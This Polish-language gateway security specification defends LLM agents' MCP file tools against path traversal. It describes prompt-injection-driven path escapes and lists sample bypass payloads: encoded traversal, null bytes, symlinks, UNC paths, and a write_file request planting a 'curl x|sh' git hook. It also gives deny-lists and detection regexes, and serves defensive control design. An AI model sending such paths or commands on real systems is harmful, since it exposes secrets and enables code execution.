# Filesystem Path Restriction (path traversal, symlink escape, allowlisted roots)
> **ID:** FS-001  | **Kategoria:** filesystem | **Priorytet:** MUST | **Złożoność:** M | **Punkt egzekwowania:** tool-call (MCP `tools/call`, argumenty ścieżkowe), output (ścieżki w odpowiedziach narzędzi)

## 1. Overview
Chronimy hosta gateway/MCP przed odczytem i zapisem plików poza dozwolonymi katalogami (allowlisted roots). Agent LLM, który wywołuje narzędzia plikowe (MCP filesystem, git, shell, edytory kodu), jest „confused deputy": jego argumenty `path` mogą pochodzić z niezaufanego tekstu (prompt injection), więc ścieżka musi być walidowana deterministycznie po stronie control layera, a nie przez model. Dotyczy to też lokalnej Ollamy na Raspberry Pi: klucze, `~/.ssh`, `/etc`, pliki konfiguracyjne gateway (polityki YAML!) i model store nie mogą być dostępne dla narzędzi.

## 2. Threat / Attack
Mechanizm krok po kroku:
1. Atakujący wstrzykuje instrukcję (dokument, strona, wynik narzędzia: indirect prompt injection) albo sam jest użytkownikiem czatu.
2. LLM generuje `tools/call` z argumentem `path` spoza roota: `../../etc/passwd`, `/home/pi/.ssh/id_rsa`, `C:\Windows\System32\config\SAM`.
3. Warianty omijania naiwnej walidacji:
   - **Sekwencje traversal**: `../`, `..\`, `....//` (po jednokrotnym usunięciu `../`), mieszane separatory na Windows.
   - **Kodowanie**: `%2e%2e%2f`, `%252e%252e%252f` (double encoding), `..%c0%af` (overlong UTF-8), pełnoszerokie znaki Unicode (`．．／`, `％２ｅ`) normalizowane dopiero w dół strumienia (NFKC).
   - **Null byte**: `allowed/../../etc/passwd%00.txt` (obcięcie w warstwie C/legacy API).
   - **Prefix confusion**: root `/data/allowed`, ścieżka `/data/allowed_evil/x` przechodzi test `startsWith` (EscapeRoute, sekcja 3).
   - **Symlink / junction / hardlink / mount point**: plik wewnątrz roota wskazuje na zewnątrz. Agent może go sam utworzyć (narzędzie zapisu + `ln -s`), a potem odczytać.
   - **TOCTOU**: ścieżka sprawdzona, potem podmieniona symlinkiem przed `open()`.
   - **Windows-specific**: ADS (`file.txt::$DATA`), nazwy zarezerwowane (`CON`, `NUL`, `COM1`), krótkie nazwy 8.3 (`PROGRA~1`), prefiksy `\\?\` i `\\.\`, ścieżki UNC (`\\attacker\share`, wyciek NTLM hash), trailing dots/spaces, wielkość liter (NTFS case-insensitive vs porównanie string).
   - **Linux-specific**: `/proc/self/environ`, `/proc/self/root/`, `/dev/*`, `/sys`, pliki specjalne (FIFO blokujące wątek: DoS).
4. Skutek: wyciek sekretów, nadpisanie konfiguracji/skryptów (np. `.bashrc`, `mcp.json`, polityk gateway), eskalacja do RCE.
5. Separacja odczyt/zapis: zapis ma znacznie większy blast radius; odczyt poza rootem to wyciek, zapis to często RCE (nadpisanie pliku wykonywanego/ładowanego automatycznie).

## 3. Real-World Evidence
| Tag | Przypadek | Mechanizm / komponent / wpływ / zapobieganie |
|---|---|---|
| [CONFIRMED-VULN] | **CVE-2025-53110** (Anthropic Filesystem MCP Server, „EscapeRoute", Cymulate) | Kontrola katalogu przez naiwne dopasowanie prefiksu: `/private/tmp/allowed_dir` akceptuje `/private/tmp/allowed_dir_evil`. Wpływ: list/read/write poza sandboxem. Naprawa w npm `2025.7.1`. Zapobieganie: porównanie po kanonikalizacji z separatorem granicznym / `Path.startsWith` na komponentach. |
| [CONFIRMED-VULN] | **CVE-2025-53109** (ten sam serwer) | Symlink wewnątrz dozwolonego katalogu wskazujący poza niego omijał sprawdzenie, pełny odczyt/zapis, potencjalnie RCE przez nadpisanie plików kodu. Zapobieganie: `realpath` (rozwiązanie symlinków) przed porównaniem z rootem, odmowa symlinków wychodzących poza root. |
| [CONFIRMED-VULN] | **CVE-2025-54794** (Claude Code, Cymulate „InversePrompt") | Ten sam błąd prefiksu w ograniczeniu CWD. Naprawa w wersji 0.2.111. Powiązany **CVE-2025-54795** to command injection (patrz CMD-001). |
| [CONFIRMED-VULN] | **CVE-2025-68143 / 68145** (mcp-server-git) | `git_init` przyjmował dowolną ścieżkę (zamienia dowolny katalog w repo); brak walidacji `repo_path` względem flagi `--repository`, więc narzędzie działało na innych repo. Osiągalne przez prompt injection. Naprawa: usunięcie `git_init`, walidacja w 2025.12.18. |
| [CONFIRMED-VULN] | **CVE-2025-68144** (mcp-server-git) | Argument injection `--output=/path` w `git_diff` pozwalał nadpisać dowolny plik (pusty diff). Pokazuje, że walidacja ścieżki musi obejmować też *flagi* narzędzi (patrz CMD-001). |
| [RESEARCH] | Klasa CWE-22 / CWE-59 (link following) / CWE-367 (TOCTOU) | OWASP Path Traversal oraz CWE: standardowe obrony to kanonikalizacja + allowlista + preferowanie uchwytów (fd) nad ścieżkami. |
| [VENDOR-CLAIM] | Zealynx / blogi agregujące EscapeRoute | Traktować jako wtórne; pierwotne źródło to Cymulate. |

Źródła i daty w sekcji 15. Wniosek praktyczny: dwie z trzech znanych luk w oficjalnych serwerach Anthropic to **prefix-match + symlink**, dokładnie to, co nasza kontrola musi pokryć testami.

## 4. Deterministic Detection
Algorytm (fail closed):
1. **Wyodrębnij ścieżki z tool-call**: z JSON schema narzędzia (pola oznaczone `x-path: read|write` w konfiguracji narzędzia) oraz heurystycznie z każdego stringa argumentu (`/`, `\`, `~`, `file://`, `%2e`). Narzędzia bez zadeklarowanych pól ścieżkowych, ale z podejrzanymi stringami → REVIEW lub BLOCK wg trybu.
2. **Odrzuć od razu**: null byte (`\u0000`, `%00`), znaki kontrolne, długość > 4096, `\\?\`/`\\.\`/UNC jeśli nie dozwolone, ADS (`:` poza literą dysku), nazwy zarezerwowane Windows.
3. **Dekoduj iteracyjnie** (percent-decode aż do stałego punktu, max 3 iteracje; jeśli nadal są `%2e/%2f` → BLOCK jako podwójne kodowanie), następnie **Unicode NFKC** i ponowne sprawdzenie na `..`, separatory.
4. **Kanonikalizacja**: Java `Path.of(root).toRealPath()` oraz `Path.of(root).resolve(input).normalize()`; dla istniejących ścieżek `toRealPath()` (rozwiązuje symlinki), dla nieistniejących (zapis nowego pliku) rozwiąż `toRealPath()` najbliższego istniejącego przodka i dołącz resztę.
5. **Containment na komponentach**: `real.startsWith(rootReal)` w `java.nio.file.Path` (porównuje komponenty, nie stringi, więc `allowed_evil` nie przejdzie). Nigdy `String.startsWith`. Windows: porównanie case-insensitive po kanonikalizacji; Linux: case-sensitive.
6. **Symlinki/junctiony**: `Files.isSymbolicLink` na każdym komponencie ewentualnie `LinkOption.NOFOLLOW_LINKS`; na Windows wykryj reparse points (`BasicFileAttributes.isOther()`/`attrs.isSymbolicLink()`); polityka: symlink wychodzący poza root = BLOCK.
7. **Deny-list wewnątrz roota**: nawet w rootcie blokuj `.git/config`, `.git/hooks/*`, `.ssh`, `.env`, `*.pem`, pliki polityk gateway, `mcp.json`, `.vscode/settings.json` (wektor CVE-2025-53773/54135, patrz CMD-001) szczególnie dla zapisu.
8. **Separacja read/write**: osobne roots i osobna lista narzędzi (`read_file`, `list_directory` vs `write_file`, `edit_file`, `move_file`, `create_directory`). `move_file` sprawdzaj dla obu argumentów (źródło i cel).
9. **Rozmiar/typ**: odmowa dla plików specjalnych (FIFO, device), `/proc`, `/sys`, `/dev`.
10. **Output**: skanuj odpowiedzi narzędzi pod kątem ścieżek absolutnych spoza roota (wyciek struktury FS) i redaguj prefiksy (np. `/home/pi/...` → `<root>/...`).
11. **TOCTOU**: kontrola w gateway jest tylko „best effort", bo między sprawdzeniem a użyciem przez serwer MCP plik może się zmienić. Pełna obrona = wykonanie operacji na otwartym deskryptorze z `openat2(RESOLVE_BENEATH|RESOLVE_NO_SYMLINKS)` (Linux 5.6+) lub kontener/chroot/bind-mount z read-only (patrz sekcja 7).

## 5. Detection Pipeline
Request → Canonicalization (decode, NFKC, usunięcie null byte) → AuthN (tożsamość agenta, przypisany profil roots) → Policy (roots per agent/tool, read vs write) → Rules (FS-001..FS-008 w kolejności priorytetu) → [MCP tool-call] → Output (FS-008 redakcja ścieżek) → Response. Filtr siedzi na ścieżce `tools/call` w gateway (`GatewayFilterFactory` dla ruchu MCP), przed przekazaniem do serwera MCP. Decyzja zapisywana w audycie z surową i kanoniczną ścieżką.

## 6. Possible Actions
- **BLOCK**: traversal poza root, symlink wychodzący, null byte, UNC/`\\?\`, deny-lista (sekrety, polityki).
- **REVIEW** (human-in-the-loop): zapis do plików konfiguracyjnych/wykonywalnych wewnątrz roota, `move_file` między rootami, ścieżka nierozpoznana w schemacie narzędzia.
- **REDACT**: ścieżki absolutne w outputach.
- **RATE_LIMIT**: seria prób różnych ścieżek poza rootem (skanowanie FS) → po N próbach QUARANTINE sesji.
- **ALLOW**: ścieżka kanoniczna w roocie, zgodny typ operacji.

## 7. Bypass / Limitations
- **TOCTOU** między gateway a serwerem MCP (symlink podmieniony po kontroli). Mitygacja: serwer MCP w kontenerze z montowanym tylko rootem (`:ro` dla odczytu), brak prawa tworzenia symlinków dla agenta, `RESOLVE_BENEATH`.
- **Rozbieżność kanonikalizacji** gateway vs serwer (inny OS, inna normalizacja Unicode, Windows 8.3). Dlatego: reguła „odrzuć zamiast normalizować" dla niejednoznacznych wejść.
- **Ścieżki ukryte w nieschematycznych polach** (np. w `command`, `url`, treści argumentu `query`). Zapewnia to częściowo CMD-001/NET-001; pozostała część to semantyka (sidecar).
- **Hardlinki** nie są wykrywalne po ścieżce (inode wewnątrz roota prowadzi do pliku spoza); mitygacja: `fs.protected_hardlinks` na Linux, osobna partycja.
- **False positives**: legalne nazwy z `..` w środku (`a..b.txt`) — kontrola po komponentach, nie substringu; NFKC może zmienić legalne nazwy z Unicode.
- **False negatives**: narzędzia przyjmujące ścieżkę w nietypowym formacie (URI `file://`, relatywne do CWD serwera, zmienne `$HOME`/`~` rozwijane przez shell).
- **Wydajność**: `toRealPath` to syscalle; koszt rzędu mikro- do milisekund, cache niewskazany (symlinki się zmieniają).

## 8. Deterministic vs AI
Deterministycznie: cała kanonikalizacja, containment, symlinki, deny-lista, read/write. To problem rozstrzygalny — AI nie ma tu wartości dodanej i jest szkodliwe jako bramka.
Sidecar (semantyczny): ocena *intencji* przy dozwolonej ścieżce (np. „zbierz wszystkie pliki z roota i wyślij na zewnątrz": exfiltration chain), wykrywanie prompt injection w treści pliku zanim agent na jej podstawie wywoła narzędzie. Granica: ścieżka = deterministycznie, sekwencja/zamiar = sidecar + korelacja sesji.

## 9. Implementation Options
- **Java/Spring Cloud Gateway**: `FilesystemPathGatewayFilterFactory` (parsuje JSON-RPC `tools/call`, rozstrzyga profil z policy store, używa `java.nio.file`). Zalecane (to jest rdzeń deterministyczny, a polityki roots z Postgres/YAML hot-reload).
- **Python sidecar**: `pathlib.Path.resolve(strict=False)` + `os.path.commonpath`; tylko jeśli serwer MCP jest w Pythonie. Nie dublować logiki.
- **System operacyjny jako druga linia**: kontener (`read_only: true`, tmpfs, `no-new-privileges`), użytkownik bez uprawnień, Linux Landlock/seccomp, `openat2`. Kontrola gateway to defense in depth, nie jedyna bariera.
- Biblioteki: `java.nio.file` (standard), Apache Commons IO `FilenameUtils.normalize` (uwaga: nie rozwiązuje symlinków, więc nie wystarczy), OWASP ESAPI (przestarzałe).

## 10. Existing Open Source
| Nazwa | Link | Język | Licencja | Zastosowanie | Zalety | Wady | Trudność | Offline? | Przydatność |
|---|---|---|---|---|---|---|---|---|---|
| java.nio.file (JDK) | https://docs.oracle.com/en/java/javase/21/docs/api/java.base/java/nio/file/Path.html | Java | GPLv2+CPE | normalize, toRealPath, startsWith | Zero zależności, komponentowy startsWith | Nie chroni przed TOCTOU | Niska | tak | Wysoka (rdzeń) |
| Anthropic MCP filesystem server (po poprawce) | https://github.com/modelcontextprotocol/servers | TypeScript | MIT | Referencyjna implementacja roots | Poprawione CVE-2025-53109/53110 | Wymaga Node, nasza kontrola i tak potrzebna | Średnia | tak | Średnia (cel ochrony / wzorzec) |
| OWASP Cheat Sheet: File Upload / Path Traversal | https://owasp.org/www-community/attacks/Path_Traversal | – | CC | Wytyczne | Autorytet | Nie jest kodem | – | tak | Wysoka (referencja) |
| Linux Landlock | https://docs.kernel.org/userspace-api/landlock.html | C/syscall | GPL | Sandbox FS na poziomie jądra | Niezależne od aplikacji | Wymaga Linux 5.13+, brak w Java bez JNI | Wysoka | tak | Średnia (hardening RPi) |
| Gitleaks (dla deny-list sekretów w ścieżkach/outputach) | https://github.com/gitleaks/gitleaks | Go | MIT | Wykrywanie sekretów | Reguły gotowe | Nie dotyczy ścieżek | Niska | tak | Niska tu, wysoka w SEC |

## 11. Proposed Control
Reguły FS-001..FS-008 jako dane (hot-reload). Roots per profil agenta (`read_roots`, `write_roots`). Tryb domyślny: fail closed dla każdego pola oznaczonego jako ścieżka.
- FS-001 Traversal i kanonikalizacja poza root (BLOCK, CRITICAL)
- FS-002 Prefix confusion (komponentowy containment; BLOCK)
- FS-003 Symlink/junction/reparse wychodzący poza root (BLOCK)
- FS-004 Null byte, kodowanie, double encoding, Unicode (BLOCK)
- FS-005 Ścieżki UNC / `\\?\` / ADS / nazwy zarezerwowane / `/proc`,`/dev`,`/sys` (BLOCK)
- FS-006 Deny-lista wewnątrz roota (sekrety, `.git/hooks`, polityki, konfiguracje IDE/MCP; BLOCK dla zapisu, REVIEW dla odczytu)
- FS-007 Separacja read/write oraz `move_file` dwustronny (BLOCK/REVIEW)
- FS-008 Redakcja ścieżek absolutnych w outputach (REDACT)

## 12. Example Configuration
```yaml
- id: FS-001
  name: Path must canonicalize inside allowed root
  category: filesystem
  enabled: true
  priority: 20
  scope: { direction: [tool-call], agents: ["*"], tools: ["read_file","write_file","edit_file","list_directory","move_file","create_directory"], environments: ["*"] }
  conditions: { path_fields_from_schema: true, fail_closed_on_unknown_path_field: true }
  matcher:
    type: path_canonical
    steps: [percent_decode_fixpoint, nfkc, reject_nul, realpath_nearest_ancestor, component_startswith]
    roots_ref: policy.filesystem.roots   # per-agent read_roots / write_roots
  action: BLOCK
  severity: CRITICAL
  threshold: null
  exceptions: []
  metadata: { owasp: [LLM06, "MCP-Top10"], cwe: [CWE-22, CWE-59], references: ["CVE-2025-53109","CVE-2025-53110","CVE-2025-54794"] }

- id: FS-003
  name: Symlink or junction resolving outside root
  category: filesystem
  enabled: true
  priority: 21
  scope: { direction: [tool-call], agents: ["*"], tools: [], environments: ["*"] }
  conditions: {}
  matcher: { type: path_symlink_escape, follow_links: false, treat_reparse_points_as_links: true }
  action: BLOCK
  severity: CRITICAL
  threshold: null
  exceptions: []
  metadata: { owasp: [LLM06], cwe: [CWE-59], references: ["CVE-2025-53109"] }

- id: FS-004
  name: Encoded traversal, null byte, unicode confusables
  category: filesystem
  enabled: true
  priority: 15
  scope: { direction: [tool-call], agents: ["*"], tools: [], environments: ["*"] }
  conditions: {}
  matcher:
    type: regex
    pattern: '(?i)(%00|\x00|%2e%2e|%252e|\.\.[\\/]|[\\/]\.\.|%c0%af|%e0%80%af|\uFF0E\uFF0E)'
  action: BLOCK
  severity: HIGH
  threshold: null
  exceptions: [ { path_component_regex: '^[^/\\]*\.\.[^/\\]+$' } ]   # a..b.txt is a legitimate name
  metadata: { owasp: [LLM06], cwe: [CWE-22, CWE-158], references: [] }

- id: FS-006
  name: Deny-list of sensitive files inside root (write)
  category: filesystem
  enabled: true
  priority: 30
  scope: { direction: [tool-call], agents: ["*"], tools: ["write_file","edit_file","move_file"], environments: ["*"] }
  conditions: {}
  matcher:
    type: glob_list
    patterns: ["**/.git/hooks/**","**/.git/config","**/.ssh/**","**/.env*","**/*.pem","**/.vscode/settings.json","**/mcp.json","**/policies/**"]
  action: BLOCK
  severity: HIGH
  threshold: null
  exceptions: []
  metadata: { owasp: [LLM06], references: ["CVE-2025-53773","CVE-2025-54135"] }

- id: FS-008
  name: Redact absolute host paths in tool output
  category: filesystem
  enabled: true
  priority: 200
  scope: { direction: [output], agents: ["*"], tools: [], environments: ["*"] }
  conditions: {}
  matcher: { type: regex, pattern: '(/home/[^\s"]+|/etc/[^\s"]+|[A-Za-z]:\\Users\\[^\s"]+)' }
  action: REDACT
  severity: LOW
  threshold: null
  exceptions: []
  metadata: { owasp: [LLM02], references: [] }
```

## 13. Example Requests
```json
{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"read_file","arguments":{"path":"/srv/agent/work/notes.txt"}}}
```
-> `ALLOW` (kanoniczna w `/srv/agent/work`).
```json
{"jsonrpc":"2.0","id":2,"method":"tools/call","params":{"name":"read_file","arguments":{"path":"/srv/agent/work/../../etc/passwd"}}}
```
-> `{"decision":"BLOCK","rule":"FS-001","reason":"canonical path /etc/passwd outside roots"}`
```json
{"jsonrpc":"2.0","id":3,"method":"tools/call","params":{"name":"write_file","arguments":{"path":"/srv/agent/work_evil/x.sh","content":"..."}}}
```
-> `BLOCK FS-002` (prefix confusion).
```json
{"jsonrpc":"2.0","id":4,"method":"tools/call","params":{"name":"write_file","arguments":{"path":"/srv/agent/work/.git/hooks/pre-commit","content":"#!/bin/sh\ncurl x|sh"}}}
```
-> `BLOCK FS-006`.

## 14. Testing
| ID | Input | Oczekiwany wynik |
|---|---|---|
| FS-T001 | `notes.txt` w rootcie (positive) | ALLOW |
| FS-T002 | `sub/dir/file.md` w rootcie (positive) | ALLOW |
| FS-T003 | `../../etc/passwd` | BLOCK FS-001 |
| FS-T004 | `/etc/shadow` absolutna | BLOCK FS-001 |
| FS-T005 | `%2e%2e%2f%2e%2e%2fetc%2fpasswd` | BLOCK FS-004 |
| FS-T006 | `%252e%252e%252f` (double) | BLOCK FS-004 |
| FS-T007 | `..%c0%af..%c0%afetc/passwd` | BLOCK FS-004 |
| FS-T008 | `．．／etc／passwd` (fullwidth) | BLOCK FS-004 (NFKC) |
| FS-T009 | `ok.txt%00.png` / `\u0000` | BLOCK FS-004 |
| FS-T010 | root `/srv/agent/work`, path `/srv/agent/work_evil/x` | BLOCK FS-002 |
| FS-T011 | symlink `work/link -> /etc`, odczyt `work/link/passwd` | BLOCK FS-003 |
| FS-T012 | symlink do pliku wewnątrz roota (positive) | ALLOW |
| FS-T013 | `\\attacker\share\f` / `\\?\C:\Windows` | BLOCK FS-005 |
| FS-T014 | `file.txt::$DATA`, `CON`, `PROGRA~1` (Windows) | BLOCK FS-005 |
| FS-T015 | `/proc/self/environ`, `/dev/zero` | BLOCK FS-005 |
| FS-T016 | zapis `.git/hooks/pre-commit` w rootcie | BLOCK FS-006 |
| FS-T017 | odczyt `.env` w rootcie | REVIEW FS-006 |
| FS-T018 | `move_file` src w rootcie, dst poza | BLOCK FS-007 |
| FS-T019 | `a..b.txt` (legalna nazwa; negative/FP) | ALLOW |
| FS-T020 | `....//....//etc/passwd` | BLOCK FS-001 |
| FS-T021 | zapis do read-only root | BLOCK FS-007 |
| FS-T022 | output zawiera `/home/pi/.ssh/id_rsa` | REDACT FS-008 |
| FS-T023 | (bypass) TOCTOU: race symlink po kontroli | Poza zakresem gateway; wymaga sandboxu OS, test integracyjny w kontenerze |
| FS-T024 | wiele prób różnych ścieżek poza rootem w 1 min | RATE_LIMIT -> QUARANTINE sesji |

## 15. Sources
- Cymulate, EscapeRoute CVE-2025-53109/53110 — https://cymulate.com/blog/cve-2025-53109-53110-escaperoute-anthropic/ — 2025 — [CONFIRMED-VULN] (wersje naprawione: 2025.7.1 / 0.6.3)
- Cymulate, InversePrompt CVE-2025-54794/54795 (Claude Code) — https://www.cymulate.com/blog/cve-2025-547954-54795-claude-inverseprompt/ — 2025 — [CONFIRMED-VULN]
- The Hacker News, Three flaws in Anthropic MCP Git server (CVE-2025-68143/68144/68145) — https://thehackernews.com/2026/01/three-flaws-in-anthropic-mcp-git-server.html — 2026-01 — [CONFIRMED-VULN]
- Wiz DB CVE-2025-54794 — https://www.wiz.io/vulnerability-database/cve/cve-2025-54794 — [CONFIRMED-VULN]
- OWASP Top 10 for LLM Applications 2025 (LLM06 Excessive Agency) — https://genai.owasp.org/llm-top-10/ — 2025 — [MITIGATION] (strona główna zweryfikowana tylko przez wyniki wyszukiwania; lista 10 pozycji potwierdzona)
- OWASP Path Traversal — https://owasp.org/www-community/attacks/Path_Traversal — [MITIGATION]
- Linux `openat2(RESOLVE_BENEATH)`, Landlock — niezweryfikowane w tej sesji (wiedza ogólna), sprawdzić w man7.org / docs.kernel.org przed cytowaniem.
